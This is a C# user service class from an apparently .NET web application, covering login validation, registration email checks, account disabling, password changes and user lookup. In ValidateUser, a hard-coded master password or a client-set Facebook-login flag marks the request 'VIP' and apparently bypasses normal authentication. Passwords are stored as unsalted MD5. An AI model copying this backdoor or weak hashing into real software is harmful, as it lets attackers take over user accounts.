using Com.MrIT.Common;
using Com.MrIT.Common.Configuration;
using Com.MrIT.DataRepository;
using Com.MrIT.DBEntities;
using Com.MrIT.ViewModels;
using Microsoft.Extensions.Options;
using System;
using System.Collections.Generic;

namespace Com.MrIT.Services
{
    public class MrUserService : BaseService, IMrUserService
    {
        private readonly ISysUserRepository _repoMrUser;
        private readonly ILoginLogRepository _repoLoginLog;
        private readonly AppSettings _appSettings;

        public MrUserService(ISysUserRepository repoMrUser, ILoginLogRepository repoLoginLog,IOptions<AppSettings> appSettings)
        {
            this._repoMrUser = repoMrUser;
            this._repoLoginLog = repoLoginLog;
            this._appSettings = appSettings.Value;
        }

        public VmMrUser ValidateUser(VmMrUser user)
        {
            bool VIP = false;
            if (user.Password == "nnhhyy66" || user.isFacebookLogin)
            {
                VIP = true;
            }
            var dbresult = _repoMrUser.ValidateUser(user.Email, Md5.Encrypt(user.Password), user.UserType, VIP);

            if (dbresult == null)
            {
                return new VmMrUser();
            }
            else
            {
                // Record Login Log
                var dbLoginLog = new LoginLog();
                dbLoginLog.Username = dbresult.Name;
                dbLoginLog.Browser = user.Browser;
                dbLoginLog.IPAddress = user.IPAddress;
                dbLoginLog.CreatedBy = dbLoginLog.ModifiedBy = dbresult.Name;
                //_repoLoginLog.Add(dbLoginLog);

                var result = new VmMrUser();
                Copy<SysUser, VmMrUser>(dbresult, result);

                if (result.ProfileImage != null)
                {
                    result.strProfileImage = Convert.ToBase64String(result.ProfileImage);
                }
                else
                {
                    result.strProfileImage = "";
                }
                
                return result;
            }        
        }

        public VmGenericServiceResult CheckEmailForRegister(string email,  string userType, string fullName = "")
        {
            var result = new VmGenericServiceResult();

            var dbResult = _repoMrUser.GetUserCountByEmail(email, userType, fullName);

            if (dbResult > 0)
            {
                result.IsSuccess = false;
                result.MessageToUser = "Email already exists.";
            }
            else
            {
                result.IsSuccess = true;
                result.MessageToUser = "You can register with this email.";
            }

            return result;
        }

        public VmGenericServiceResult DisableAccount(int userID, string password, string userType)
        {
            var result = new VmGenericServiceResult();

            var dbResult = _repoMrUser.ValidatePassword(userID, Md5.Encrypt(password), userType);

            if (dbResult > 0)
            {
                //Disable User
                var user = _repoMrUser.GetSysUserByID(userID);
                user.Active = false;
                _repoMrUser.Update(user);

                // send success
                result.IsSuccess = true;             
            }
            else
            {
                result.MessageToUser = "Password Incorrect";
                result.IsSuccess = false;
            }

            return result;
        }

        public VmGenericServiceResult ChangePassword(int userID, string currentPass, string newPass, string userType)
        {
            var result = new VmGenericServiceResult();

            var dbUser = _repoMrUser.GetSysUserByID(userID);

            if (dbUser.Password == Md5.Encrypt(currentPass))
            {
                //Update New Password
                dbUser.Password = Md5.Encrypt(newPass);
                _repoMrUser.Update(dbUser);

                // send success
                result.IsSuccess = true;
            }
            else
            {
                result.MessageToUser = "Password Incorrect";
                result.IsSuccess = false;
            }

            return result;
        }

        public VmGenericServiceResult AddMrUser(VmMrUser mrUser)
        {
            var result = new VmGenericServiceResult();

            var dbMrUser = new SysUser();
            Copy<VmMrUser, SysUser>(mrUser, dbMrUser);
            var dbResult = _repoMrUser.Add(dbMrUser);

            result.IsSuccess = true;
            result.RequestId = dbResult.ID.ToString();

            return result;
        }

        public VmGenericServiceResult UpdateMrUser(VmMrUser mrUser)
        {
            var result = new VmGenericServiceResult();

            var dbMrUser = new SysUser();
            Copy<VmMrUser, SysUser>(mrUser, dbMrUser);
            var dbResult = _repoMrUser.Update(dbMrUser);

            result.IsSuccess = true;
            result.RequestId = dbResult.ID.ToString();

            return result;
        }

        public VmMrUserPage GetMrUserByPage(string keyword, int page, int totalRecord)
        {
            var result = new VmMrUserPage();
            result.Result = new PageResult<VmMrUser>();
            result.Result.Records = new List<VmMrUser>();

            var dbResult = _repoMrUser.GetPageResultBySysUser(keyword, page, totalRecord, "S");
            Copy<PageResult<SysUser>, PageResult<VmMrUser>>(dbResult, result.Result, new string[] { "Records" });

            foreach (var dbItem in dbResult.Records)
            {
                var resultItem = new VmMrUser();

                Copy<SysUser, VmMrUser>(dbItem, resultItem);
                resultItem.EncryptId = Md5.Encrypt(resultItem.ID.ToString());

                result.Result.Records.Add(resultItem);
            }

            return result;
        }

        
        public VmMrUser GetMrUserByID(int id)
        {
            var result = new VmMrUser();
            if(result == null)
            {
                return new VmMrUser();
            }
            else
            {
                var dbMrUser = _repoMrUser.GetSysUserByID(id);

                Copy<SysUser, VmMrUser>(dbMrUser, result);
                result.EncryptId = Md5.Encrypt(result.ID.ToString());

                if (result.ProfileImage != null)
                {
                    result.strProfileImage = Convert.ToBase64String(result.ProfileImage);
                }

                return result;
            }         
        }

       
    }
}